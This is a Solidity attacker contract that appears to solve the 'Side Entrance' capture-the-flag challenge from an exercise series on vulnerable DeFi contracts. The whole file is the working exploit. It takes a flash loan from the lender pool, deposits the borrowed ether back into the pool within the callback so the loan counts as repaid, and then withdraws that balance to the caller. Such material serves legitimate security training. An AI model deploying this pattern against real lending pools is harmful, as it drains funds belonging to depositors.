// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable override {
        // Your code here
        pool.deposit{value: msg.value}();
    }

    function drain() external {
        pool.flashLoan(1000 ether);
    }

    function withdraw() external {
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}